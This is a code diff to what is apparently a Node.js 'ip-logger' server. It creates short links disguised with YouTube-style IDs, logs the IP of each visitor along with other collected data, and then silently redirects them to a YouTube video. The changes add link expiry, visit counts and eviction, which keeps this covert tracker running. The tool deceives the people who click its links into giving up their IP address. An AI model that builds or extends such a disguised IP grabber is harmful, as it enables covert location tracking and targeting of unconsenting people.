@@ -10,7 +10,7 @@ const SERVER_URL = process.env.SERVER_URL || 'https://ip-logger-kpo8.onrender.co
 // Store IPs in memory
 let trackedIPs = [];
 
-// Store URL mappings
+// Store URL mappings with timestamps
 let urlMappings = new Map();
 
 // Middleware to get real IP - MOVED TO TOP
@@ -37,6 +37,16 @@ function generateYouTubeId() {
         result += chars.charAt(Math.floor(Math.random() * chars.length));
     }
     return result;
+}
+
+// Fonction pour nettoyer les vieux mappings (plus vieux que 24h)
+function cleanOldMappings() {
+    const now = Date.now();
+    for (const [key, value] of urlMappings.entries()) {
+        if (now - value.timestamp > 24 * 60 * 60 * 1000) { // 24 heures
+            urlMappings.delete(key);
+        }
+    }
 }
 
 // Fonction pour traiter l'IP et collecter les données
@@ -98,6 +108,8 @@ async function processIpAndCollectData(req, videoId) {
 // Route pour créer un lien court
 app.get('/api/shorten', (req, res) => {
     try {
+        cleanOldMappings(); // Nettoyer les vieux mappings
+
         const originalUrl = req.query.url;
         if (!originalUrl) {
             return res.status(400).json({ error: 'URL required' });
@@ -109,11 +121,24 @@ app.get('/api/shorten', (req, res) => {
         }
 
         const trackingId = generateYouTubeId();
-        urlMappings.set(trackingId, videoId);
+        // Stocker avec un timestamp
+        urlMappings.set(trackingId, {
+            videoId: videoId,
+            timestamp: Date.now(),
+            visits: 0
+        });
         
         if (urlMappings.size > 1000) {
-            const firstKey = urlMappings.keys().next().value;
-            urlMappings.delete(firstKey);
+            // Supprimer le plus ancien
+            let oldestKey = null;
+            let oldestTime = Infinity;
+            for (const [key, value] of urlMappings.entries()) {
+                if (value.timestamp < oldestTime) {
+                    oldestTime = value.timestamp;
+                    oldestKey = key;
+                }
+            }
+            if (oldestKey) urlMappings.delete(oldestKey);
         }
 
         const trackingUrl = `${SERVER_URL}/t/${trackingId}`;
@@ -132,15 +157,21 @@ app.get('/api/shorten', (req, res) => {
 // Route pour le tracking
 app.get('/t/:id', async (req, res) => {
     try {
-        const videoId = urlMappings.get(req.params.id);
-        if (!videoId) {
+        const mapping = urlMappings.get(req.params.id);
+        if (!mapping) {
             console.log('\x1b[33m%s\x1b[0m', `No video found for tracking ID: ${req.params.id}`);
             return res.redirect('https://youtube.com');
         }
 
+        const videoId = mapping.videoId;
+        mapping.visits++; // Incrémenter le compteur de visites
+
         // Process IP and collect data
         await processIpAndCollectData(req, videoId);
 
+        // Mettre à jour le timestamp pour garder le lien actif
+        mapping.timestamp = Date.now();
+        
         // Redirect to YouTube
         res.redirect(`https://youtu.be/watch?v=${videoId}`);
     } catch (error) {
